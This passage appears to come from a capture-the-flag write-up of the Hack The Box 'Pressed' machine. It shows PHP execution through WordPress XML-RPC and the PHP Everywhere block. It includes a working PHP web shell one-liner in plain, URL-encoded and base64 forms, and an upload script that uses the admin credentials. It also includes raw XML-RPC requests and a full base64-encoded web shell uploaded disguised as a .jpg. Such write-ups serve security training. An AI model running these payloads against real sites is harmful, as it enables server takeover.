  &lt;member&gt;&lt;name&gt;post_status&lt;/name&gt;&lt;value&gt;&lt;string&gt;publish&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_title&lt;/name&gt;&lt;value&gt;&lt;string&gt;title&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_author&lt;/name&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;mt_keywords&lt;/name&gt;&lt;value&gt;&lt;string&gt;keywords&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;categories&lt;/name&gt;&lt;value&gt;&lt;string&gt;categories&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_content&lt;/name&gt;&lt;value&gt;&lt;string&gt;&amp;lt;!-- wp:php-everywhere-block/php {&amp;quot;code&amp;quot;:&amp;quot;JTNDJTNGcGhwJTIwcGhwaW5mbygpJTNCJTIwJTNGJTNF&amp;quot;,&amp;quot;version&amp;quot;:&amp;quot;3.0.0&amp;quot;} /--&amp;gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;&lt;/methodCall&gt;
</pre>

<pre class="ixr_response">HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 17:16:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 177
Content-Type: text/xml; charset=UTF-8

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;string&gt;49&lt;/string&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;

</pre>
```

Visting _http://pressed.htb/index.php/2022/02/05/title-2/_ our php code is sucessfully executed

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot6.png)

# SIMPLE WEB SHELL UPLOAD

Unfortunately the host is heavily firewalled and afaik reverse or bind shell is not possible at this stage (not even ICMP can pass through back), so we have to resort to the old boring php shell. In order to get initial access we can use the fact that /uploads/ directory most probably would be writable, so we will upload a minimal php web shell that will allow us to execute commands via HTTP GET requests. For that we will create a new post, that once visited will create on itself the shell.
PHP Code:
```
<?php system("echo '<?php \$cmd = (\$_REQUEST['cmd']); system(\$cmd); ?>' > /var/www/html/wp-content/uploads/2022/02/blah.php"); ?>
```
URL Encoded:
```
%3C%3Fphp%20system%28%22echo%20%27%3C%3Fphp%20%5C%24cmd%20%3D%20%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B%20system%28%5C%24cmd%29%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F2022%2F02%2Fblah.php%22%29%3B%20%3F%3E
```

Base64 Encoded:
```
JTNDJTNGcGhwJTIwc3lzdGVtJTI4JTIyZWNobyUyMCUyNyUzQyUzRnBocCUyMCU1QyUyNGNtZCUyMCUzRCUyMCUyOCU1QyUyNF9SRVFVRVNUJTVCJTI3Y21kJTI3JTVEJTI5JTNCJTIwc3lzdGVtJTI4JTVDJTI0Y21kJTI5JTNCJTIwJTNGJTNFJTI3JTIwJTNFJTIwJTJGdmFyJTJGd3d3JTJGaHRtbCUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAyMiUyRjAyJTJGYmxhaC5waHAlMjIlMjklM0IlMjAlM0YlM0U=
```

Final payload for post:
```
<?php
include('IXR_Library.php');
$usr = 'admin';
$pwd = 'uhc-jan-finals-2022';
$xmlrpc = 'http://pressed.htb/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$client -> debug = true;
$params = array(
    'post_type' => 'post',
    'post_status' => 'publish',
    'post_title' => 'title',
    'post_author' => 1,
    'mt_keywords' => 'keywords',
    'categories' => 'categories',
    'post_content' => '<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwc3lzdGVtJTI4JTIyZWNobyUyMCUyNyUzQyUzRnBocCUyMCU1QyUyNGNtZCUyMCUzRCUyMCUyOCU1QyUyNF9SRVFVRVNUJTVCJTI3Y21kJTI3JTVEJTI5JTNCJTIwc3lzdGVtJTI4JTVDJTI0Y21kJTI5JTNCJTIwJTNGJTNFJTI3JTIwJTNFJTIwJTJGdmFyJTJGd3d3JTJGaHRtbCUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAyMiUyRjAyJTJGYmxhaC5waHAlMjIlMjklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->'
);
$res = $client -> query('wp.newPost',1, $usr, $pwd, $params);
?>
```
Creating the post:
```
# php upload.php
PHP Warning:  Module 'xmlrpc' already loaded in Unknown on line 0
<pre class="ixr_request">POST /xmlrpc.php HTTP/1.0
Host: pressed.htb
Content-Type: text/xml
User-Agent: The Incutio XML-RPC PHP Library
Content-Length: 1297

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;wp.newPost&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;uhc-jan-finals-2022&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;struct&gt;
  &lt;member&gt;&lt;name&gt;post_type&lt;/name&gt;&lt;value&gt;&lt;string&gt;post&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_status&lt;/name&gt;&lt;value&gt;&lt;string&gt;publish&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_title&lt;/name&gt;&lt;value&gt;&lt;string&gt;title&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_author&lt;/name&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;mt_keywords&lt;/name&gt;&lt;value&gt;&lt;string&gt;keywords&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;categories&lt;/name&gt;&lt;value&gt;&lt;string&gt;categories&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_content&lt;/name&gt;&lt;value&gt;&lt;string&gt;&amp;lt;!-- wp:php-everywhere-block/php {&amp;quot;code&amp;quot;:&amp;quot;JTNDJTNGcGhwJTIwc3lzdGVtJTI4JTIyZWNobyUyMCUyNyUzQyUzRnBocCUyMCU1QyUyNGNtZCUyMCUzRCUyMCUyOCU1QyUyNF9SRVFVRVNUJTVCJTI3Y21kJTI3JTVEJTI5JTNCJTIwc3lzdGVtJTI4JTVDJTI0Y21kJTI5JTNCJTIwJTNGJTNFJTI3JTIwJTNFJTIwJTJGdmFyJTJGd3d3JTJGaHRtbCUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAyMiUyRjAyJTJGYmxhaC5waHAlMjIlMjklM0IlMjAlM0YlM0U=&amp;quot;,&amp;quot;version&amp;quot;:&amp;quot;3.0.0&amp;quot;} /--&amp;gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;&lt;/methodCall&gt;
</pre>

<pre class="ixr_response">HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 17:35:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 177
Content-Type: text/xml; charset=UTF-8

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;string&gt;53&lt;/string&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;

</pre>
```

Visting _http://pressed.htb/index.php/2022/02/05/title-4/_ to execute the payload.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot7.png)

And checking /wp-content/uploads/ to make sure payload is created.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot7-1.png)

Confirming we can execute shell commands. Executing `id` reveals webserver is running as `www-data`

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot8.png)

# MORE USABLE WEB SHELL WITH UPLOAD CAPABILITIES

Next step is to upload a more-usable web shell with upload capabilities so we're not bothered with encoding/decoding every time. For that we will use WhiteWinterWolf's php shell, that can be downloaded from https://github.com/WhiteWinterWolf/wwwolf-php-webshell. Instead of going through all the hassle we will use another XML-RPC method that allows image file upload. For that we will rename webshell.php to ws.jpg, base64 encode it, upload it via wp.uploadFile method and then use our limited web shell to rename it back to php.

```
# file webshell.jpg
webshell.jpg: ASCII text
# cat webshell.jpg |base64
Izw/cGhwCi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiAqIENvcHlyaWdodCAyMDE3IFdoaXRlV2ludGVyV29sZgogKiBodHRwczovL3d3dy53aGl0ZXdpbnRlcndvbGYuY29tL3RhZ3MvcGhwLXdlYnNoZWxsLwogKgogKiBUaGlzIGZpbGUgaXMgcGFydCBvZiB3d29sZi1waHAtd2Vic2hlbGwuCiAqCiAqIHd3d29sZi1waHAtd2Vic2hlbGwgaXMgZnJlZSBzb2Z0d2FyZTogeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQogKiBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQogKiB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcgogKiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgogKgogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKICogTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQogKiBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgogKgogKiBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvPi4KICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8qCiAqIE9wdGlvbmFsIHBhc3N3b3JkIHNldHRpbmdzLgogKiBVc2UgdGhlICdwYXNzaGFzaC5zaCcgc2NyaXB0IHRvIGdlbmVyYXRlIHRoZSBoYXNoLgogKiBOT1RFOiB0aGUgcHJvbXB0IHZhbHVlIGlzIHRpZWQgdG8gdGhlIGhhc2ghCiAqLwokcGFzc3Byb21wdCA9ICJXaGl0ZVdpbnRlcldvbGYncyBQSFAgd2Vic2hlbGw6ICI7CiRwYXNzaGFzaCA9ICIiOwoKZnVuY3Rpb24gZSgkcykgeyBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHMsIEVOVF9RVU9URVMpOyB9CgpmdW5jdGlvbiBoKCRzKQp7CglnbG9iYWwgJHBhc3Nwcm9tcHQ7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdoYXNoX2htYWMnKSkKCXsKCQlyZXR1cm4gaGFzaF9obWFjKCdzaGEyNTYnLCAkcywgJHBhc3Nwcm9tcHQpOwoJfQoJZWxzZQoJewoJCXJldHVybiBiaW4yaGV4KG1oYXNoKE1IQVNIX1NIQTI1NiwgJHMsICRwYXNzcHJvbXB0KSk7Cgl9Cn0KCmZ1bmN0aW9uIGZldGNoX2ZvcGVuKCRob3N0LCAkcG9ydCwgJHNyYywgJGRzdCkKewoJZ2xvYmFsICRlcnIsICRvazsKCSRyZXQgPSAnJzsKCWlmIChzdHJwb3MoJGhvc3QsICc6Ly8nKSA9PT0gZmFsc2UpCgl7CgkJJGhvc3QgPSAnaHR0cDovLycgLiAkaG9zdDsKCX0KCWVsc2UKCXsKCQkkaG9zdCA9IHN0cl9yZXBsYWNlKGFycmF5KCdzc2w6Ly8nLCAndGxzOi8vJyksICdodHRwczovLycsICRob3N0KTsKCX0KCSRyaCA9IGZvcGVuKCIke2hvc3R9OiR7cG9ydH0ke3NyY30iLCAncmInKTsKCWlmICgkcmggIT09IGZhbHNlKQoJewoJCSR3aCA9IGZvcGVuKCRkc3QsICd3YicpOwoJCWlmICgkd2ggIT09IGZhbHNlKQoJCXsKCQkJJGNieXRlcyA9IDA7CgkJCXdoaWxlICghIGZlb2YoJHJoKSkKCQkJewoJCQkJJGNieXRlcyArPSBmd3JpdGUoJHdoLCBmcmVhZCgkcmgsIDEwMjQpKTsKCQkJfQoJCQlmY2xvc2UoJHdoKTsKCQkJJHJldCAuPSAiJHtva30gRmV0Y2hlZCBmaWxlIDxpPiR7ZHN0fTwvaT4gKCR7Y2J5dGVzfSBieXRlcyk8YnIgLz4iOwoJCX0KCQllbHNlCgkJewoJCQkkcmV0IC49ICIke2Vycn0gRmFpbGVkIHRvIG9wZW4gZmlsZSA8aT4ke2RzdH08L2k+PGJyIC8+IjsKCQl9CgkJZmNsb3NlKCRyaCk7Cgl9CgllbHNlCgl7CgkJJHJldCA9ICIke2Vycn0gRmFpbGVkIHRvIG9wZW4gVVJMIDxpPiR7aG9zdH06JHtwb3J0fSR7c3JjfTwvaT48YnIgLz4iOwoJfQoJcmV0dXJuICRyZXQ7Cn0KCmZ1bmN0aW9uIGZldGNoX3NvY2soJGhvc3QsICRwb3J0LCAkc3JjLCAkZHN0KQp7CglnbG9iYWwgJGVyciwgJG9rOwoJJHJldCA9ICcnOwoJJGhvc3QgPSBzdHJfcmVwbGFjZSgnaHR0cHM6Ly8nLCAndGxzOi8vJywgJGhvc3QpOwoJJHMgPSBmc29ja29wZW4oJGhvc3QsICRwb3J0KTsKCWlmICgkcykKCXsKCQkkZiA9IGZvcGVuKCRkc3QsICd3YicpOwoJCWlmICgkZikKCQl7CgkJCSRidWYgPSAnJzsKCQkJJHIgPSBhcnJheSgkcyk7CgkJCSR3ID0gTlVMTDsKCQkJJGUgPSBOVUxMOwoJCQlmd3JpdGUoJHMsICJHRVQgJHtzcmN9IEhUVFAvMS4wXHJcblxyXG4iKTsKCQkJd2hpbGUgKHN0cmVhbV9zZWxlY3QoJHIsICR3LCAkZSwgNSkgJiYgIWZlb2YoJHMpKQoJCQl7CgkJCQkkYnVmIC49IGZyZWFkKCRzLCAxMDI0KTsKCQkJfQoJCQkkYnVmID0gc3Vic3RyKCRidWYsIHN0cnBvcygkYnVmLCAiXHJcblxyXG4iKSArIDQpOwoJCQlmd3JpdGUoJGYsICRidWYpOwoJCQlmY2xvc2UoJGYpOwoJCQkkcmV0IC49ICIke29rfSBGZXRjaGVkIGZpbGUgPGk+JHtkc3R9PC9pPiAoIiAuIHN0cmxlbigkYnVmKSAuICIgYnl0ZXMpPGJyIC8+IjsKCQl9CgkJZWxzZQoJCXsKCQkJJHJldCAuPSAiJHtlcnJ9IEZhaWxlZCB0byBvcGVuIGZpbGUgPGk+JHtkc3R9PC9pPjxiciAvPiI7CgkJfQoJCWZjbG9zZSgkcyk7Cgl9CgllbHNlCgl7CgkJJHJldCAuPSAiJHtlcnJ9IEZhaWxlZCB0byBjb25uZWN0IHRvIDxpPiR7aG9zdH06JHtwb3J0fTwvaT48YnIgLz4iOwoJfQoJcmV0dXJuICRyZXQ7Cn0KCmluaV9zZXQoJ2xvZ19lcnJvcnMnLCAnMCcpOwppbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsICcxJyk7CmVycm9yX3JlcG9ydGluZyhFX0FMTCk7Cgp3aGlsZSAoQCBvYl9lbmRfY2xlYW4oKSk7CgppZiAoISBpc3NldCgkX1NFUlZFUikpCnsKCWdsb2JhbCAkSFRUUF9QT1NUX0ZJTEVTLCAkSFRUUF9QT1NUX1ZBUlMsICRIVFRQX1NFUlZFUl9WQVJTOwoJJF9GSUxFUyA9ICYkSFRUUF9QT1NUX0ZJTEVTOwoJJF9QT1NUID0gJiRIVFRQX1BPU1RfVkFSUzsKCSRfU0VSVkVSID0gJiRIVFRQX1NFUlZFUl9WQVJTOwp9CgokYXV0aCA9ICcnOwokY21kID0gZW1wdHkoJF9QT1NUWydjbWQnXSkgPyAnJyA6ICRfUE9TVFsnY21kJ107CiRjd2QgPSBlbXB0eSgkX1BPU1RbJ2N3ZCddKSA/IGdldGN3ZCgpIDogJF9QT1NUWydjd2QnXTsKJGZldGNoX2Z1bmMgPSAnZmV0Y2hfZm9wZW4nOwokZmV0Y2hfaG9zdCA9IGVtcHR5KCRfUE9TVFsnZmV0Y2hfaG9zdCddKSA/ICRfU0VSVkVSWydSRU1PVEVfQUREUiddIDogJF9QT1NUWydmZXRjaF9ob3N0J107CiRmZXRjaF9wYXRoID0gZW1wdHkoJF9QT1NUWydmZXRjaF9wYXRoJ10pID8gJycgOiAkX1BPU1RbJ2ZldGNoX3BhdGgnXTsKJGZldGNoX3BvcnQgPSBlbXB0eSgkX1BPU1RbJ2ZldGNoX3BvcnQnXSkgPyAnODAnIDogJF9QT1NUWydmZXRjaF9wb3J0J107CiRwYXNzID0gZW1wdHkoJF9QT1NUWydwYXNzJ10pID8gJycgOiAkX1BPU1RbJ3Bhc3MnXTsKJHVybCA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokc3RhdHVzID0gJyc7CiRvayA9ICcmIzk3ODY7IDonOwokd2FybiA9ICcmIzk4ODg7IDonOwokZXJyID0gJyYjOTc4NTsgOic7CgppZiAoISBlbXB0eSgkcGFzc2hhc2gpKQp7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdoYXNoX2htYWMnKSB8fCBmdW5jdGlvbl9leGlzdHMoJ21oYXNoJykpCgl7CgkJJGF1dGggPSBlbXB0eSgkX1BPU1RbJ2F1dGgnXSkgPyBoKCRwYXNzKSA6ICRfUE9TVFsnYXV0aCddOwoJCWlmIChoKCRhdXRoKSAhPT0gJHBhc3NoYXNoKQoJCXsKCQkJPz4KCQkJCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlKCR1cmwpOyA/PiI+CgkJCQkJPD9waHAgZSgkcGFzc3Byb21wdCk7ID8+CgkJCQkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBzaXplPSIxNSIgbmFtZT0icGFzcyI+CgkJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNlbmQiPgoJCQkJPC9mb3JtPgoJCQk8P3BocAoJCQlleGl0OwoJCX0KCX0KCWVsc2UKCXsKCQkkc3RhdHVzIC49ICIke3dhcm59IEF1dGhlbnRpY2F0aW9uIGRpc2FibGVkICgnbWhhc2goKScgbWlzc2luZykuPGJyIC8+IjsKCX0KfQoKaWYgKCEgaW5pX2dldCgnYWxsb3dfdXJsX2ZvcGVuJykpCnsKCWluaV9zZXQoJ2FsbG93X3VybF9mb3BlbicsICcxJyk7CglpZiAoISBpbmlfZ2V0KCdhbGxvd191cmxfZm9wZW4nKSkKCXsKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc2VsZWN0JykpCgkJewoJCQkkZmV0Y2hfZnVuYyA9ICdmZXRjaF9zb2NrJzsKCQl9CgkJZWxzZQoJCXsKCQkJJGZldGNoX2Z1bmMgPSAnJzsKCQkJJHN0YXR1cyAuPSAiJHt3YXJufSBGaWxlIGZldGNoaW5nIGRpc2FibGVkICgnYWxsb3dfdXJsX2ZvcGVuJyIKCQkJCS4gIiBkaXNhYmxlZCBhbmQgJ3N0cmVhbV9zZWxlY3QoKScgbWlzc2luZykuPGJyIC8+IjsKCQl9Cgl9Cn0KaWYgKCEgaW5pX2dldCgnZmlsZV91cGxvYWRzJykpCnsKCWluaV9zZXQoJ2ZpbGVfdXBsb2FkcycsICcxJyk7CglpZiAoISBpbmlfZ2V0KCdmaWxlX3VwbG9hZHMnKSkKCXsKCQkkc3RhdHVzIC49ICIke3dhcm59IEZpbGUgdXBsb2FkcyBkaXNhYmxlZC48YnIgLz4iOwoJfQp9CmlmIChpbmlfZ2V0KCdvcGVuX2Jhc2VkaXInKSAmJiAhIGluaV9zZXQoJ29wZW5fYmFzZWRpcicsICcnKSkKewoJJHN0YXR1cyAuPSAiJHt3YXJufSBvcGVuX2Jhc2VkaXIgPSAiIC4gaW5pX2dldCgnb3Blbl9iYXNlZGlyJykgLiAiPGJyIC8+IjsKfQoKaWYgKCEgY2hkaXIoJGN3ZCkpCnsKICAkY3dkID0gZ2V0Y3dkKCk7Cn0KCmlmICghIGVtcHR5KCRmZXRjaF9mdW5jKSAmJiAhIGVtcHR5KCRmZXRjaF9wYXRoKSkKewoJJGRzdCA9ICRjd2QgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJGZldGNoX3BhdGgpOwoJJHN0YXR1cyAuPSAkZmV0Y2hfZnVuYygkZmV0Y2hfaG9zdCwgJGZldGNoX3BvcnQsICRmZXRjaF9wYXRoLCAkZHN0KTsKfQoKaWYgKGluaV9nZXQoJ2ZpbGVfdXBsb2FkcycpICYmICEgZW1wdHkoJF9GSUxFU1sndXBsb2FkJ10pKQp7CgkkZGVzdCA9ICRjd2QgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSk7CglpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3VwbG9hZCddWyd0bXBfbmFtZSddLCAkZGVzdCkpCgl7CgkJJHN0YXR1cyAuPSAiJHtva30gVXBsb2FkZWQgZmlsZSA8aT4ke2Rlc3R9PC9pPiAoIiAuICRfRklMRVNbJ3VwbG9hZCddWydzaXplJ10gLiAiIGJ5dGVzKTxiciAvPiI7Cgl9Cn0KPz4KCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlKCR1cmwpOyA/PiIKCTw/cGhwIGlmIChpbmlfZ2V0KCdmaWxlX3VwbG9hZHMnKSk6ID8+CgkJZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIKCTw/cGhwIGVuZGlmOyA/PgoJPgoJPD9waHAgaWYgKCEgZW1wdHkoJHBhc3NoYXNoKSk6ID8+CgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYXV0aCIgdmFsdWU9Ijw/cGhwIGUoJGF1dGgpOyA/PiI+Cgk8P3BocCBlbmRpZjsgPz4KCTx0YWJsZSBib3JkZXI9IjAiPgoJCTw/cGhwIGlmICghIGVtcHR5KCRmZXRjaF9mdW5jKSk6ID8+CgkJCTx0cj48dGQ+CgkJCQk8Yj5GZXRjaDo8L2I+CgkJCTwvdGQ+PHRkPgoJCQkJaG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBpZD0iZmV0Y2hfaG9zdCIgbmFtZT0iZmV0Y2hfaG9zdCIgdmFsdWU9Ijw/cGhwIGUoJGZldGNoX2hvc3QpOyA/PiI+CgkJCQlwb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNCIgaWQ9ImZldGNoX3BvcnQiIG5hbWU9ImZldGNoX3BvcnQiIHZhbHVlPSI8P3BocCBlKCRmZXRjaF9wb3J0KTsgPz4iPgoJCQkJcGF0aDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBpZD0iZmV0Y2hfcGF0aCIgbmFtZT0iZmV0Y2hfcGF0aCIgdmFsdWU9IiI+CgkJCTwvdGQ+PC90cj4KCQk8P3BocCBlbmRpZjsgPz4KCQk8dHI+PHRkPgoJCQk8Yj5DV0Q6PC9iPgoJCTwvdGQ+PHRkPgoJCQk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIGlkPSJjd2QiIG5hbWU9ImN3ZCIgdmFsdWU9Ijw/cGhwIGUoJGN3ZCk7ID8+Ij4KCQkJPD9waHAgaWYgKGluaV9nZXQoJ2ZpbGVfdXBsb2FkcycpKTogPz4KCQkJCTxiPlVwbG9hZDo8L2I+IDxpbnB1dCB0eXBlPSJmaWxlIiBpZD0idXBsb2FkIiBuYW1lPSJ1cGxvYWQiPgoJCQk8P3BocCBlbmRpZjsgPz4KCQk8L3RkPjwvdHI+CgkJPHRyPjx0ZD4KCQkJPGI+Q21kOjwvYj4KCQk8L3RkPjx0ZD4KCQkJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjgwIiBpZD0iY21kIiBuYW1lPSJjbWQiIHZhbHVlPSI8P3BocCBlKCRjbWQpOyA/PiI+CgkJPC90ZD48L3RyPgoJCTx0cj48dGQ+CgkJPC90ZD48dGQ+CgkJCTxzdXA+PGEgaHJlZj0iIyIgb25jbGljaz0iY21kLnZhbHVlPScnOyBjbWQuZm9jdXMoKTsgcmV0dXJuIGZhbHNlOyI+Q2xlYXIgY21kPC9hPjwvc3VwPgoJCTwvdGQ+PC90cj4KCQk8dHI+PHRkIGNvbHNwYW49IjIiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7Ij4KCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiIHN0eWxlPSJ0ZXh0LWFsaWduOiByaWdodDsiPgoJCTwvdGQ+PC90cj4KCTwvdGFibGU+CgkKPC9mb3JtPgo8aHIgLz4KCjw/cGhwCmlmICghIGVtcHR5KCRzdGF0dXMpKQp7CgllY2hvICI8cD4ke3N0YXR1c308L3A+IjsKfQoKZWNobyAiPHByZT4iOwppZiAoISBlbXB0eSgkY21kKSkKewoJZWNobyAiPGI+IjsKCWUoJGNtZCk7CgllY2hvICI8L2I+XG4iOwoJaWYgKERJUkVDVE9SWV9TRVBBUkFUT1IgPT0gJy8nKQoJewoJCSRwID0gcG9wZW4oJ2V4ZWMgMj4mMTsgJyAuICRjbWQsICdyJyk7Cgl9CgllbHNlCgl7CgkJJHAgPSBwb3BlbignY21kIC9DICInIC4gJGNtZCAuICciIDI+JjEnLCAncicpOwoJfQoJd2hpbGUgKCEgZmVvZigkcCkpCgl7CgkJZWNobyBodG1sc3BlY2lhbGNoYXJzKGZyZWFkKCRwLCA0MDk2KSwgRU5UX1FVT1RFUyk7CgkJQCBmbHVzaCgpOwoJfQp9CmVjaG8gIjwvcHJlPiI7CgpleGl0Owo/Pgo=
```
_Burp_ request to upload the file as _ws.jpg_:
```
POST /xmlrpc.php HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

<?xml version='1.0' encoding='utf-8'?>
<methodCall>
	<methodName>wp.uploadFile</methodName>
	<params>
		<param><value><string>1</string></value></param>
		<param><value><string>admin</string></value></param>
		<param><value><string>uhc-jan-finals-2022</string></value></param>
		<param>
			<value>
				<struct>
					<member>
						<name>name</name>
						<value><string>ws.jpg</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>mime/type</string></value>
					</member>
					<member>
						<name>bits</name>
						<value><base64><![CDATA[Izw/cGhwCi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqK ....
						...
						...
						aG8gIjwvcHJlPiI7CgpleGl0Owo/Pgo=]]></base64></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```
Upload was successfull and our webshell is available under _/wp-content/uploads/2022/02/ws.jpg_:
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 17:50:13 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 1275
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <struct>
  <member><name>attachment_id</name><value><string>55</string></value></member>
  <member><name>date_created_gmt</name><value><dateTime.iso8601>20220205T17:50:13</dateTime.iso8601></value></member>
  <member><name>parent</name><value><int>0</int></value></member>
